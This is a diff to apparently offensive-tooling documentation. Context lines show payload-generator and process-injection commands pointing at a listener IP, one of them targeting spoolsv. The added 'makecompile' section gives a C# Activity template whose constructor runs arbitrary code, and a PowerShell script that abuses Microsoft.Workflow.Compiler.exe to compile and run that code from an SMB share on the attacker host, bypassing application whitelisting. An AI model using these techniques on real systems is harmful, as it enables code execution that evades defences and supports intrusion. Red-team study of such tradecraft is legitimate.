@@ -143,3 +143,37 @@ python3 makelat.py -a 64 -l 192.168.135.7 -p 443 -t local -n localhost -b "c:\wi
 python3 makeinject.py -a 64 -l 192.168.135.7 -p 443
 python3 makeinject.py -a 64 -l 192.168.135.7 -p 443 -s spoolsv
 ```
+
+### makecompile
+```
+using System;
+using System.Workflow.ComponentModel;
+using System.Runtime.InteropServices;
+public class Run : Activity{
+    ...
+    <csharp declarations>
+    ...
+    
+    public Run() {
+     
+      ...
+      <csharp code>
+      ...
+      
+      Console.WriteLine("I executed!");
+    }
+}
+```
+```
+$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
+$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
+$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper',[Reflection.BindingFlags] 'NonPublic, Static')
+Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
+$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
+$compilerparam.GenerateInMemory = $True
+$pathvar = "\\192.168.135.7\visualstudio\tools\compile.txt"
+$output = "\\192.168.135.7\visualstudio\tools\run.xml"
+$tmp = $SerializeInputToWrapper.Invoke($null,@([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam,[String[]] @(,$pathvar)))
+Remove-Item $output -erroraction 'silentlycontinue'
+Move-Item $tmp $output
+```
